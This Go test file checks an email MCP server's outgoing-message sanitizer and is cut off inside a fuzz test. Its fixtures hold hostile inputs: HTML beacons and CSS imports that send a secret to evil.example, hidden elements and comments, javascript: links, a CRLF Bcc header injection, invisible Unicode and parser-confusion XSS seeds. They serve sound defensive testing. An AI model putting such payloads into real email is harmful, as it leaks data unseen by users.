package mime

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/EmadMokhtar/email-mcp-go/internal/domain/mail"
	"github.com/EmadMokhtar/email-mcp-go/internal/thirdparty/xhtml"
)

// secret is data that must not leave in a place that the user cannot see.
const secret = "SECRET-DATA"

// requireTextEqualsHTML checks the main rule of an outgoing message with HTML:
// the text part, which the preview shows, is the text of the HTML part.
func requireTextEqualsHTML(t *testing.T, p *Parsed) {
	t.Helper()
	text, err := HTMLToText(p.HTML)
	require.NoError(t, err)
	require.Equal(t, text, CleanUntrusted(p.Text))
}

func TestOutgoingHTMLCarriesNothingThatThePreviewCannotShow(t *testing.T) {
	const visible = `<p>Thanks, received.</p>`
	long := "https://example.com/?d=" + secret + strings.Repeat("a", maxShownURL)
	for name, markup := range map[string]string{
		"a comment":                        visible + `<!-- ` + secret + ` -->`,
		"display none":                     visible + `<div style="display:none">` + secret + `</div>`,
		"font size zero":                   visible + `<div style="font-size:0">` + secret + `</div>`,
		"a hidden element":                 visible + `<div hidden>` + secret + `</div>`,
		"a style rule":                     `<style>.x{display:none}</style>` + visible + `<p class="x">` + secret + `</p>`,
		"a remote image":                   visible + `<img src="https://evil.example/p.gif?d=` + secret + `">`,
		"an image alt":                     visible + `<img alt="` + secret + `">`,
		"a link element":                   `<link rel="stylesheet" href="https://evil.example/c.css?d=` + secret + `">` + visible,
		"a css url":                        `<p style="background:url(https://evil.example/p.gif?d=` + secret + `)">Thanks, received.</p>`,
		"a css import":                     `<style>@import "https://evil.example/c.css?d=` + secret + `";</style>` + visible,
		"an iframe":                        visible + `<iframe src="https://evil.example/?d=` + secret + `"></iframe>`,
		"an object":                        visible + `<object data="https://evil.example/?d=` + secret + `">` + secret + `</object>`,
		"a svg":                            visible + `<svg><text>` + secret + `</text></svg>`,
		"a base":                           `<base href="https://evil.example/` + secret + `/">` + visible,
		"a meta":                           `<meta http-equiv="refresh" content="0;url=https://evil.example/` + secret + `">` + visible,
		"a body image":                     `<body background="https://evil.example/p.gif?d=` + secret + `">` + visible + `</body>`,
		"data attribute":                   `<p data-x="` + secret + `">Thanks, received.</p>`,
		"other attributes":                 `<p title="` + secret + `" id="` + secret + `" lang="` + secret + `">Thanks, received.</p>`,
		"a link that the text cannot show": visible + `<a href="` + long + `">more</a>`,
		"all of it at once": visible + `<img src="https://evil.example/p.gif?d=` + secret + `">` +
			`<div style="display:none">` + secret + `</div><!-- ` + secret + ` -->`,
	} {
		t.Run(name, func(t *testing.T) {
			raw := mustBuild(t, mail.Compose{To: []string{"bob@x"}, HTMLBody: markup}, newContext())

			p := parsedOf(t, raw.Data)
			require.NotContains(t, p.HTML, secret)
			require.NotContains(t, p.Text, secret)
			for _, tag := range []string{"<img", "<!--", "<style", "<link", "<iframe", "<object", "<svg", "<base", "<meta", "style="} {
				require.NotContains(t, p.HTML, tag)
			}
			require.Contains(t, p.Text, "Thanks, received.")
			requireTextEqualsHTML(t, p)
		})
	}
}

func TestOutgoingHTMLKeepsWhatAReaderSees(t *testing.T) {
	raw := mustBuild(t, mail.Compose{To: []string{"bob@x"}, HTMLBody: `<h1 style="color:red">Plan</h1>` +
		`<ul><li>One</li><li><b>Two</b></li></ul><table><tr><td>Cell</td></tr></table>` +
		`<a href="https://example.com/a?b=c" target="_blank">site</a> <a href="mailto:bob@x">mail</a> ` +
		`<a href="javascript:alert(1)">bad</a>`}, newContext())

	p := parsedOf(t, raw.Data)
	require.Contains(t, p.HTML, "<h1>Plan</h1>")
	require.Contains(t, p.HTML, "<li><b>Two</b></li>")
	require.Contains(t, p.HTML, "<td>Cell</td>")
	require.Contains(t, p.HTML, `href="https://example.com/a?b=c"`)
	require.Contains(t, p.HTML, `href="mailto:bob@x"`)
	require.NotContains(t, p.HTML, "javascript")
	require.NotContains(t, p.HTML, "target")
	require.Contains(t, p.Text, "site (https://example.com/a?b=c)")
	requireTextEqualsHTML(t, p)
}

func TestOutgoingHTMLHasNoHiddenCharacters(t *testing.T) {
	raw := mustBuild(t, mail.Compose{To: []string{"bob@x"}, HTMLBody: "<p>pay\u200Bme&#8203;\U000E0041 &#xE0041;\u202Eok</p>"}, newContext())

	p := parsedOf(t, raw.Data)
	require.Equal(t, "<p>payme ok</p>", p.HTML)
	requireTextEqualsHTML(t, p)
}

// HTML that loses all of its content must not become an empty message with no
// word to the agent that wrote it.
func TestOutgoingHTMLWithNothingToShowIsRefused(t *testing.T) {
	for _, c := range []mail.Compose{
		{To: []string{"bob@x"}, HTMLBody: `<!-- ` + secret + ` -->`},
		{To: []string{"bob@x"}, HTMLBody: `<img src="https://evil.example/` + secret + `">` + "\n"},
		{To: []string{"bob@x"}, Body: "another text", HTMLBody: `<div hidden>x</div>`},
	} {
		raw, err := Build(c, newContext())
		require.ErrorIs(t, err, ErrEmptyHTML, "%q", c.HTMLBody)
		require.Nil(t, raw)
	}

	// Nothing was removed from HTML that is only white space.
	raw := mustBuild(t, mail.Compose{To: []string{"bob@x"}, HTMLBody: "  \n"}, newContext())
	require.Equal(t, "text/plain", mediaTypeOf(t, headerOf(t, raw.Data)), "there is no HTML part")
}

// A message has one text. With HTML, it is the text of the HTML, also when a
// caller of Build gives a body too.
func TestOutgoingTextOfHTMLWinsOverABody(t *testing.T) {
	raw := mustBuild(t, mail.Compose{To: []string{"bob@x"}, Body: "another text", HTMLBody: "<p>real text</p>"}, newContext())

	p := parsedOf(t, raw.Data)
	require.NotContains(t, p.Text, "another text")
	requireTextEqualsHTML(t, p)
}

func TestForwardWithHTMLHasTheTextOfTheWholeHTML(t *testing.T) {
	bc := newContext()
	bc.Original = originalMessage()
	raw := mustBuild(t, mail.Compose{
		ForwardOf: forwardOf(), To: []string{"dave@x"},
		HTMLBody: `<p>fyi</p><div style="display:none">` + secret,
	}, bc)

	p := parsedOf(t, raw.Data)
	require.NotContains(t, p.HTML, secret)
	require.Contains(t, p.HTML, forwardedMarker, "the block of the forward is not swallowed by an element that is not closed")
	require.Contains(t, p.Text, "original text")
	requireTextEqualsHTML(t, p)
}

func TestBuildRefusesHiddenTextInTheSubject(t *testing.T) {
	// Each tag character is 4 bytes that the preview does not show.
	var tags strings.Builder
	for r := rune(0xE0041); r < 0xE0041+12; r++ {
		tags.WriteRune(r)
	}
	for _, subject := range []string{
		"Hello" + tags.String(),
		"tag \U000E0041",
		"zero\u200Bwidth",
		"bidi\u202Eoverride",
		"soft\u00ADhyphen",
		"braille\u2800blank",
		"private\uE000use",
		"selector\uFE00one",
		"a\u200Cb",
		"a\u200Db",
		"a\uFE0Fb",
	} {
		raw, err := Build(mail.Compose{To: []string{"bob@x"}, Subject: subject, Body: "hi"}, newContext())
		require.ErrorIs(t, err, ErrHiddenText, "%q", subject)
		require.Nil(t, raw)
		require.NotContains(t, err.Error(), "Hello", "the error holds no text of the message")
	}
}

func TestBuildRefusesHiddenTextInTheBody(t *testing.T) {
	for _, body := range []string{
		"Thanks\U000E0041",
		"Thanks\u200B",
		"Thanks\x07",
		"a\u2800b",
		"a\uF8FFb",
		"a\U00100000b",
	} {
		_, err := Build(mail.Compose{To: []string{"bob@x"}, Body: body}, newContext())
		require.ErrorIs(t, err, ErrHiddenText, "%q", body)
	}
}

func TestBuildRefusesHiddenTextInADisplayName(t *testing.T) {
	for name, c := range map[string]mail.Compose{
		"to":  {To: []string{"Bo\u200Bb <bob@x>"}},
		"cc":  {To: []string{"bob@x"}, Cc: []string{"Car\U000E0041ol <carol@x>"}},
		"bcc": {To: []string{"bob@x"}, Bcc: []string{"Dan\u202E <dan@x>"}},
	} {
		t.Run(name, func(t *testing.T) {
			_, err := Build(c, newContext())
			require.ErrorIs(t, err, ErrHiddenText)
		})
	}
}

func TestBuildRefusesHiddenTextInAnAttachmentName(t *testing.T) {
	for _, name := range []string{"a\u2800.txt", "a\uE000.txt", "a\U000E0100.txt"} {
		_, err := Build(mail.Compose{To: []string{"bob@x"}, Body: "hi", Attachments: []mail.OutgoingAttachment{
			{Filename: name, ContentType: "text/plain", Data: []byte("x")},
		}}, newContext())
		require.ErrorIs(t, err, ErrInvalidFilename, "%q", name)
	}
}

// Text that people write must still go out: the joiners that change how letters
// join, and emoji sequences.
func TestBuildKeepsTextThatNeedsJoiners(t *testing.T) {
	for _, text := range []string{
		"\u0645\u06CC\u200C\u0631\u0648\u0645",               // Persian with ZWNJ
		"\u0915\u094D\u200D\u0937",                           // Devanagari with ZWJ
		"\U0001F468\u200D\U0001F469\u200D\U0001F467",         // family
		"\U0001F3F3\uFE0F\u200D\U0001F308",                   // rainbow flag
		"\U0001F469\U0001F3FD\u200D\U0001F4BB",               // woman technologist, medium skin tone
		"\u2764\uFE0F",                                       // heart
		"1\uFE0F\u20E3",                                      // keycap
		"Hello, \u0645\u0631\u062D\u0628\u0627 \u4F60\u597D", // no joiners, several scripts
	} {
		raw := mustBuild(t, mail.Compose{To: []string{`"` + text + `" <bob@x>`}, Subject: text, Body: text}, newContext())

		p := parsedOf(t, raw.Data)
		require.Equal(t, text, p.Text)
		require.Equal(t, text, DecodeHeaderValue(headerOf(t, raw.Data).Get("Subject")))
	}
}

// What the original message says comes from a third party. It must not stop a
// reply or a forward, and what a user cannot see must not go out.
func TestOriginalValuesAreCleanedNotRefused(t *testing.T) {
	const hidden = "\u200B\U000E0041\u202E\u2800"
	dirty := func() BuildContext {
		bc := newContext()
		bc.Original = originalMessage()
		bc.Original.Subject = "Pla" + hidden + "ns"
		bc.Original.From = mail.Address{Name: "Ali" + hidden + "ce", Email: "alice@x"}
		bc.Original.To = []mail.Address{{Name: "Bo" + hidden + "b", Email: "bob@x"}, {Email: "me@x"}}
		bc.Original.Text = "ori" + hidden + "ginal text"
		return bc
	}

	t.Run("a reply", func(t *testing.T) {
		raw := mustBuild(t, mail.Compose{ReplyTo: replyTo(true), Body: "Yes."}, dirty())

		h := headerOf(t, raw.Data)
		require.Equal(t, "Re: Plans", DecodeHeaderValue(h.Get("Subject")))
		require.Equal(t, `"Alice" <alice@x>`, DecodeHeaderValue(h.Get("To")))
		require.Contains(t, DecodeHeaderValue(h.Get("Cc")), `"Bob" <bob@x>`)
	})

	t.Run("a forward", func(t *testing.T) {
		raw := mustBuild(t, mail.Compose{ForwardOf: forwardOf(), To: []string{"dave@x"}, Body: "fyi"}, dirty())

		require.Equal(t, "Fwd: Plans", DecodeHeaderValue(headerOf(t, raw.Data).Get("Subject")))
		p := parsedOf(t, raw.Data)
		require.Zero(t, HiddenRunes(p.Text), "%q", p.Text)
		require.Contains(t, p.Text, "original text")
		require.Contains(t, p.Text, "Subject: Plans")
		require.Contains(t, p.Text, "From: Alice <alice@x>")
	})

	t.Run("a forward with HTML", func(t *testing.T) {
		raw := mustBuild(t, mail.Compose{ForwardOf: forwardOf(), To: []string{"dave@x"}, HTMLBody: "<p>fyi</p>"}, dirty())

		p := parsedOf(t, raw.Data)
		require.Zero(t, HiddenRunes(p.Text), "%q", p.Text)
		require.Zero(t, HiddenRunes(p.HTML), "%q", p.HTML)
		requireTextEqualsHTML(t, p)
	})

	t.Run("an agent cannot use the same text itself", func(t *testing.T) {
		_, err := Build(mail.Compose{ReplyTo: replyTo(false), Subject: "Re: Pla" + hidden + "ns", Body: "Yes."}, dirty())
		require.ErrorIs(t, err, ErrHiddenText)
	})

	t.Run("an attachment name of the original", func(t *testing.T) {
		bc := dirty()
		bc.OriginalAttachments = []mail.Attachment{{
			AttachmentInfo: mail.AttachmentInfo{Filename: "pl\u2800an" + hidden + ".pdf", ContentType: "application/pdf"},
			Data:           []byte("x"),
		}}
		raw := mustBuild(t, mail.Compose{ForwardOf: forwardOf(), To: []string{"dave@x"}, Body: "fyi", IncludeOriginalAttachments: true}, bc)

		p := parsedOf(t, raw.Data)
		require.Len(t, p.Attachments, 1)
		require.Equal(t, "plan.pdf", p.Attachments[0].Filename)
	})
}

// A draft goes through Build too, so it cannot hold what a send cannot.
func TestDraftFollowsTheSameRules(t *testing.T) {
	bc := newContext()
	bc.ForDraft = true

	_, err := Build(mail.Compose{Subject: "a\U000E0041"}, bc)
	require.ErrorIs(t, err, ErrHiddenText)

	raw := mustBuild(t, mail.Compose{HTMLBody: `<p>hi</p><!-- ` + secret + ` -->`}, bc)
	p := parsedOf(t, raw.Data)
	require.NotContains(t, p.HTML, secret)
	requireTextEqualsHTML(t, p)
}

// A link grows when it is written out: a byte that is not ASCII becomes %XX. The
// test for the longest link that is shown must count that.
func TestOutgoingLinkIsMeasuredAsItIsWritten(t *testing.T) {
	href := "https://example.com/?d=" + strings.Repeat("\U00004F60", maxShownURL/9+1)
	raw := mustBuild(t, mail.Compose{To: []string{"bob@x"}, HTMLBody: `<a href="` + href + `">more</a>`}, newContext())

	p := parsedOf(t, raw.Data)
	require.NotContains(t, p.HTML, "href")
	require.Contains(t, p.HTML, "more")
	requireTextEqualsHTML(t, p)
}

// hrefsOf returns the href of each link of an HTML part, decoded.
func hrefsOf(t *testing.T, markup string) []string {
	t.Helper()
	doc, err := parseHTML(markup)
	require.NoError(t, err)
	var out []string
	var walk func(n *xhtml.Node)
	walk = func(n *xhtml.Node) {
		if href, ok := attributeValue(n, "href"); ok && n.Type == xhtml.ElementNode {
			out = append(out, href)
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			walk(c)
		}
	}
	walk(doc)
	return out
}

// A link goes out only as the text shows it, whatever form it had.
func TestEveryOutgoingHrefIsInTheTextPart(t *testing.T) {
	for name, href := range map[string]string{
		"a plain link":          "https://example.com/a/b",
		"a query":               "https://example.com/a?b=c&d=e",
		"a fragment":            "https://example.com/a#b",
		"a mailto link":         "mailto:bob@x?subject=hi&body=hello",
		"a space":               "https://example.com/a b",
		"round brackets":        "https://example.com/a(b)c",
		"square brackets":       "https://example.com/a[b]c",
		"a quote":               `https://example.com/a'b`,
		"letters of a language": "https://example.com/\U00004F60\U0000597D?q=\U000000E9",
		"a capital scheme":      "HTTPS://Example.COM/A",
		"white space around":    "  https://example.com/a  ",
		"a tab inside":          "https://exa\tmple.com/a",
		"a hidden character":    "https://example.com/a\U0000200Bb",
		"a tag character":       "https://example.com/a\U000E0041b",
		"an escape":             "https://example.com/a%20b%2Fc",
		"a user":                "https://someone@example.com/",
		"a port":                "https://example.com:8443/a",
		"an empty path":         "https://example.com",
		"the longest not cut":   "https://example.com/" + strings.Repeat("a", maxShortPath-1),
		"a long query not cut":  "https://example.com/a?" + strings.Repeat("b", maxShortQuery-1),
	} {
		t.Run(name, func(t *testing.T) {
			markup := `<p>before</p><a href="` + strings.ReplaceAll(href, `"`, "&#34;") + `">more</a>`
			raw := mustBuild(t, mail.Compose{To: []string{"bob@x"}, HTMLBody: markup}, newContext())

			p := parsedOf(t, raw.Data)
			hrefs := hrefsOf(t, p.HTML)
			require.Len(t, hrefs, 1, "%q", p.HTML)
			require.Contains(t, p.Text, hrefs[0])
			require.Zero(t, HiddenRunes(hrefs[0]))
			requireTextEqualsHTML(t, p)
		})
	}
}

func TestOutgoingLinkThatTheTextDoesNotShowLosesItsHref(t *testing.T) {
	const site = "https://example.com/"
	for name, href := range map[string]string{
		"one byte over the limit":      site + strings.Repeat("a", maxShownURL-len(site)+1),
		"the longest that fits":        site + strings.Repeat("a", maxShownURL-len(site)),
		"a relative link":              "/a/b",
		"another scheme":               "ftp://example.com/a",
		"a script":                     "javascript:alert(1)",
		"a path that the text cuts":    site + strings.Repeat("a", maxShortPath),
		"a query that the text cuts":   site + "a?" + strings.Repeat("b", maxShortQuery),
		"a host that the text cuts":    "https://" + strings.Repeat("h", maxShortHost+1) + ".example.com/",
		"a user that the text cuts":    "https://" + strings.Repeat("u", maxShortUser+1) + "@example.com/",
		"a mailto body that is cut":    "mailto:bob@x?body=" + strings.Repeat("b", maxShortQuery+1),
		"a mailto address that is cut": "mailto:" + strings.Repeat("a", maxShortPath+1) + "@example.com",
		// The cut of this path gives the path itself. A reader takes the mark for a
		// cut, so the text does not count as showing the whole url.
		"a url that has the cut mark itself": site + strings.Repeat("a", maxShortPath-1) + urlCutMark,
	} {
		t.Run(name, func(t *testing.T) {
			raw := mustBuild(t, mail.Compose{To: []string{"bob@x"}, HTMLBody: `<a href="` + href + `">more</a>`}, newContext())

			p := parsedOf(t, raw.Data)
			require.Empty(t, hrefsOf(t, p.HTML), "%q", p.HTML)
			require.Contains(t, p.Text, "more")
			requireTextEqualsHTML(t, p)
		})
	}
}

// A link that the text cuts has no href, and the text part does not show a url
// for it. So the cut of the text (PR 38) and the rule that an href is the whole
// url shown (PR 37) both hold.
func TestOutgoingLinkWithACutURLShowsNoURLInTheText(t *testing.T) {
	href := "https://example.com/" + strings.Repeat("a", 200)
	raw := mustBuild(t, mail.Compose{To: []string{"bob@x"}, HTMLBody: `<p>See <a href="` + href + `">the report</a></p>`}, newContext())

	p := parsedOf(t, raw.Data)

	require.Empty(t, hrefsOf(t, p.HTML), "%q", p.HTML)
	require.Equal(t, "See the report", p.Text)
}

// linkURL is what the text shows, and normalizedURL is the whole url. Outgoing
// HTML keeps a link only when the two are the same.
func TestLinkURLIsTheNormalizedURLUpToTheLimit(t *testing.T) {
	link := func(href string) *xhtml.Node {
		return &xhtml.Node{Type: xhtml.ElementNode, Data: "a", Attr: []xhtml.Attribute{{Key: "href", Val: href}}}
	}
	short := "https://example.com/a b"
	require.Equal(t, "https://example.com/a%20b", normalizedURL(link(short)))
	require.Equal(t, normalizedURL(link(short)), linkURL(link(short)))

	// A url with a long part is cut in the text but whole in normalizedURL.
	cut := "https://example.com/" + strings.Repeat("a", 2*maxShortPath)
	require.Equal(t, cut, normalizedURL(link(cut)))
	require.Equal(t, "https://example.com/"+strings.Repeat("a", maxShortPath-1)+urlCutMark, linkURL(link(cut)))
	require.NotEqual(t, normalizedURL(link(cut)), linkURL(link(cut)))

	long := "https://example.com/" + strings.Repeat("a", maxShownURL)
	require.Equal(t, long, normalizedURL(link(long)))
	require.Empty(t, linkURL(link(long)))

	require.Empty(t, normalizedURL(link("javascript:alert(1)")))
	require.Empty(t, normalizedURL(&xhtml.Node{Type: xhtml.ElementNode, Data: "a"}))
}

func TestBuildKeepsOnlyTheCharsetOfAnAttachmentContentType(t *testing.T) {
	const contentType = `text/plain; charset=utf-8; x-note="` + secret + `"; name="` + secret + `.txt"; format=flowed`

	t.Run("a new attachment", func(t *testing.T) {
		raw := mustBuild(t, mail.Compose{To: []string{"bob@x"}, Body: "hi", Attachments: []mail.OutgoingAttachment{
			{Filename: "a.txt", ContentType: contentType, Data: []byte("x")},
		}}, newContext())

		require.NotContains(t, string(raw.Data), secret)
		require.NotContains(t, string(raw.Data), "flowed")
		require.Contains(t, string(raw.Data), "charset=utf-8")
		p := parsedOf(t, raw.Data)
		require.Len(t, p.Attachments, 1)
		require.Equal(t, "text/plain", p.Attachments[0].ContentType)
	})

	t.Run("an attachment of the original", func(t *testing.T) {
		bc := newContext()
		bc.Original = originalMessage()
		bc.OriginalAttachments = []mail.Attachment{{
			AttachmentInfo: mail.AttachmentInfo{Filename: "a.txt", ContentType: contentType},
			Data:           []byte("x"),
		}}
		raw := mustBuild(t, mail.Compose{ForwardOf: forwardOf(), To: []string{"dave@x"}, Body: "fyi", IncludeOriginalAttachments: true}, bc)

		require.NotContains(t, string(raw.Data), secret)
	})

	t.Run("a type with no parameters", func(t *testing.T) {
		raw := mustBuild(t, mail.Compose{To: []string{"bob@x"}, Body: "hi", Attachments: []mail.OutgoingAttachment{
			{Filename: "a.pdf", ContentType: "application/pdf", Data: []byte("x")},
		}}, newContext())

		require.Contains(t, string(raw.Data), "Content-Type: application/pdf")
	})
}

// attachedAs is a short message with one attachment of the given content type.
func attachedAs(contentType string) mail.Compose {
	return mail.Compose{To: []string{"bob@x"}, Body: "hi", Attachments: []mail.OutgoingAttachment{
		{Filename: "a.bin", ContentType: contentType, Data: []byte("x")},
	}}
}

// The media types of Office documents are long, and people send these files
// every day. They must go out as they are, new or forwarded.
func TestOfficeMediaTypesGoOut(t *testing.T) {
	for name, mediaType := range map[string]string{
		"docx": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
		"xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
		"pptx": "application/vnd.openxmlformats-officedocument.presentationml.presentation",
	} {
		t.Run(name, func(t *testing.T) {
			raw := mustBuild(t, attachedAs(mediaType), newContext())
			require.Equal(t, mediaType, parsedOf(t, raw.Data).Attachments[0].ContentType)

			bc := newContext()
			bc.Original = originalMessage()
			bc.OriginalAttachments = []mail.Attachment{{
				AttachmentInfo: mail.AttachmentInfo{Filename: "a." + name, ContentType: mediaType},
				Data:           []byte("x"),
			}}
			raw = mustBuild(t, mail.Compose{ForwardOf: forwardOf(), To: []string{"dave@x"}, Body: "fyi", IncludeOriginalAttachments: true}, bc)
			require.Equal(t, mediaType, parsedOf(t, raw.Data).Attachments[0].ContentType)
		})
	}
}

func TestBuildRefusesAMediaTypeOverTheLimit(t *testing.T) {
	require.Equal(t, 100, MaxMediaTypeBytes, "the error text and the tool schema name this number")
	fits := "application/" + strings.Repeat("x", MaxMediaTypeBytes-len("application/"))
	attach := attachedAs

	raw := mustBuild(t, attach(fits), newContext())
	require.Equal(t, fits, parsedOf(t, raw.Data).Attachments[0].ContentType)

	for name, contentType := range map[string]string{
		"one byte too long":   fits + "x",
		"a long subtype":      "application/" + strings.Repeat(secret, 20),
		"with a charset too":  fits + "x; charset=utf-8",
		"a long type in caps": strings.ToUpper(fits) + "X",
	} {
		t.Run(name, func(t *testing.T) {
			got, err := Build(attach(contentType), newContext())
			require.ErrorIs(t, err, ErrInvalidContentType)
			require.Nil(t, got)
			require.NotContains(t, err.Error(), secret, "the error holds no text of the message")
		})
	}
}

// The type of an original comes from a third party. It must not stop a forward.
func TestForwardOfAnOriginalWithALongMediaTypeGoesOut(t *testing.T) {
	bc := newContext()
	bc.Original = originalMessage()
	bc.OriginalAttachments = []mail.Attachment{
		{AttachmentInfo: mail.AttachmentInfo{
			Filename:    "report.docx",
			ContentType: "application/" + strings.Repeat("x", MaxMediaTypeBytes),
		}, Data: []byte("x")},
		{AttachmentInfo: mail.AttachmentInfo{Filename: "plan.pdf", ContentType: "application/pdf"}, Data: []byte("x")},
	}
	c := mail.Compose{ForwardOf: forwardOf(), To: []string{"dave@x"}, Body: "fyi", IncludeOriginalAttachments: true}

	raw := mustBuild(t, c, bc)

	p := parsedOf(t, raw.Data)
	require.Equal(t, "application/octet-stream", p.Attachments[0].ContentType)
	require.Equal(t, "application/pdf", p.Attachments[1].ContentType, "a type that fits stays")
	require.Equal(t, "report.docx", p.Attachments[0].Filename)
}

// AttachmentType says what Build writes, so a preview can show the same type. A
// type that is found from the data is the type that goes out too.
func TestAttachmentTypeIsWhatBuildWrites(t *testing.T) {
	png := append([]byte("\x89PNG\r\n\x1a\n"), make([]byte, 40)...)
	c := mail.Compose{To: []string{"bob@x"}, Body: "hi", Attachments: []mail.OutgoingAttachment{
		{Filename: "a.pdf", ContentType: "application/pdf", Data: []byte("x")},
		{Filename: "b.txt", ContentType: "Text/Plain; charset=UTF-8; format=flowed", Data: []byte("x")},
		{Filename: "c.png", Data: png},
		{Filename: "d.txt", Data: []byte("plain words")},
	}}

	raw := mustBuild(t, c, newContext())

	var types []string
	for _, a := range OutgoingAttachments(c, newContext()) {
		types = append(types, AttachmentType(a))
	}
	require.Equal(t, []string{"application/pdf", "text/plain", "image/png", "text/plain"}, types)
	for i, att := range parsedOf(t, raw.Data).Attachments {
		require.Equal(t, types[i], att.ContentType, "attachment %d", i)
	}
}

// OutgoingAttachments says what Build writes, so a preview can show the same
// names.
func TestOutgoingAttachmentsAreWhatBuildWrites(t *testing.T) {
	const hidden = "\U0000200B\U000E0041"
	bc := newContext()
	bc.Original = originalMessage()
	bc.OriginalAttachments = []mail.Attachment{
		{AttachmentInfo: mail.AttachmentInfo{Filename: "pl" + hidden + "an.pdf", ContentType: "application/pdf"}, Data: []byte("1")},
		{AttachmentInfo: mail.AttachmentInfo{Filename: "two\U00002028lines.pdf", ContentType: "application/pdf"}, Data: []byte("2")},
		{AttachmentInfo: mail.AttachmentInfo{Filename: "\U00000645\U000006CC\U0000200C\U00000631.pdf", ContentType: "application/pdf"}, Data: []byte("3")},
		{AttachmentInfo: mail.AttachmentInfo{Filename: "", ContentType: "application/pdf"}, Data: []byte("4")},
		{AttachmentInfo: mail.AttachmentInfo{Filename: hidden, ContentType: "application/pdf"}, Data: []byte("5")},
	}
	c := mail.Compose{
		ForwardOf: forwardOf(), To: []string{"dave@x"}, Body: "fyi", IncludeOriginalAttachments: true,
		Attachments: []mail.OutgoingAttachment{
			{Filename: "own.txt", ContentType: "text/plain", Data: []byte("6")},
			{ContentType: "text/plain", Data: []byte("7")},
		},
	}

	raw := mustBuild(t, c, bc)

	var names []string
	for _, a := range OutgoingAttachments(c, bc) {
		names = append(names, a.Filename)
	}
	require.Equal(t, []string{
		"plan.pdf", "two lines.pdf", "\U00000645\U000006CC\U0000200C\U00000631.pdf", "attachment", "attachment", "own.txt", "attachment",
	}, names)
	require.Equal(t, names, attachmentNames(parsedOf(t, raw.Data)))
	require.Empty(t, c.Attachments[1].Filename, "Build does not change its arguments")
}

func TestOutgoingAttachmentsOfANewMessage(t *testing.T) {
	require.Nil(t, OutgoingAttachments(mail.Compose{To: []string{"bob@x"}}, newContext()))
}

// A file name follows the same rule as a subject: the joiners that change how
// letters look may stay.
func TestAttachmentNameWithJoinersOfAScriptThatNeedsThem(t *testing.T) {
	persian := "\U00000645\U000006CC\U0000200C\U00000631\U00000648\U00000645.pdf"
	raw := mustBuild(t, mail.Compose{To: []string{"dave@x"}, Attachments: []mail.OutgoingAttachment{
		{Filename: persian, ContentType: "application/pdf", Data: []byte("x")},
	}}, newContext())
	require.Equal(t, []string{persian}, attachmentNames(parsedOf(t, raw.Data)))

	_, err := Build(mail.Compose{To: []string{"dave@x"}, Attachments: []mail.OutgoingAttachment{
		{Filename: "a\U0000200Cb.pdf", ContentType: "application/pdf", Data: []byte("x")},
	}}, newContext())
	require.ErrorIs(t, err, ErrInvalidFilename, "between Latin letters it changes nothing that a reader sees")
}

func TestVisibleFormatCharactersGoOut(t *testing.T) {
	text := "\U000006DD\U00000661 \U00000600\U00000661"
	raw := mustBuild(t, mail.Compose{To: []string{"bob@x"}, Subject: text, Body: text}, newContext())
	require.Equal(t, text, parsedOf(t, raw.Data).Text)
	require.Equal(t, text, DecodeHeaderValue(headerOf(t, raw.Data).Get("Subject")))

	for _, mark := range []string{"\U0000200E", "\U0000200F", "\U0000061C"} {
		_, err := Build(mail.Compose{To: []string{"bob@x"}, Subject: "a" + mark}, newContext())
		require.ErrorIs(t, err, ErrHiddenText, "a direction mark cannot be seen")
	}
}

func TestBuildReportsTheDisplayNamesOfTheRecipients(t *testing.T) {
	t.Run("a new message", func(t *testing.T) {
		raw := mustBuild(t, mail.Compose{
			To:  []string{"Bob <bob@x>", "ann@x"},
			Cc:  []string{"Carol Smith <carol@x>"},
			Bcc: []string{"Dan <dan@x>"},
			// An address that is in To already stays there, with the first name.
			Subject: "S", Body: "hi",
		}, newContext())

		require.Equal(t, []string{"bob@x", "ann@x", "carol@x", "dan@x"}, raw.Recipients)
		require.Equal(t, []string{"Bob", "", "Carol Smith", "Dan"}, raw.Names)
	})

	t.Run("a reply to all has the cleaned names of the original", func(t *testing.T) {
		bc := newContext()
		bc.Original = originalMessage()
		bc.Original.From.Name = "Ali\U0000200Bce\r\nBcc: evil@x"
		bc.Original.To = []mail.Address{{Name: "Bo\U000E0041b", Email: "bob@x"}, {Email: "me@x"}}
		raw := mustBuild(t, mail.Compose{ReplyTo: replyTo(true), Body: "Yes."}, bc)

		require.Equal(t, []string{"alice@x", "bob@x", "carol@x"}, raw.Recipients)
		require.Equal(t, []string{"Alice Bcc: evil@x", "Bob", ""}, raw.Names)
	})

	t.Run("a draft has the names of its headers, Bcc too", func(t *testing.T) {
		raw, err := FromDraft([]byte("From: Me <me@x>\r\nTo: Ann <ann@x>, bob@x\r\nCc: Carol <carol@x>\r\nBcc: Dan <dan@x>\r\n\r\nhi\r\n"))
		require.NoError(t, err)

		require.Equal(t, []string{"ann@x", "bob@x", "carol@x", "dan@x"}, raw.Recipients)
		require.Equal(t, []string{"Ann", "", "Carol", "Dan"}, raw.Names)
	})
}

// The main rule for any markup: what goes out holds no comment, no attribute
// that can carry data, no element that a reader does not see, and no link that
// the text does not show.
func FuzzOutgoingHTML(f *testing.F) {
	for _, seed := range []string{
		"",
		"<p>plain</p>",
		`<p>Thanks.</p><img src="https://evil.example/p.gif?d=x"><div style="display:none">x</div><!-- x -->`,
		`<a href="https://example.com/a b">x</a><a href="mailto:a@b.test?body=x">y</a><a href="javascript:x">z</a>`,
		`<math><annotation-xml encoding="text/html"><!-- x --><img src=x></annotation-xml></math>`,
		`<svg><style><!-- </style><img src=x>--></svg>`,
		`<noscript><p title="</noscript><img src=x>"></noscript>`,
		`<xmp><img src=x></xmp><plaintext><!-- x`,
		`<textarea><!-- x --></textarea><title><!-- x --></title>`,
		`<table><td><a href="https://example.com">x<table><a href="https://example.org">y`,
		`<details open><summary>x</summary>y</details><dialog>z</dialog>`,
		"<p>a\U0000200Bb&#8203;c&#xE0041;d\U00002800e</p>",
		`<a href="https://example.com/` + strings.Repeat("a", maxShownURL) + `">x</a>`,
		`<ruby>x<rp>(</rp><rt>y</rt><rp>)</rp></ruby><wbr><bdo dir="rtl">z</bdo>`,
	} {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, in string) {
		out, err := outgoingHTML(in)
		if err != nil {
			require.ErrorIs(t, err, ErrHTMLTooComplex)
			return
		}
		require.Zero(t, HiddenRunes(out), "%q", out)
		doc, err := parseHTML(out)
		if err != nil {
			return // the result can be just over the limit of the parser
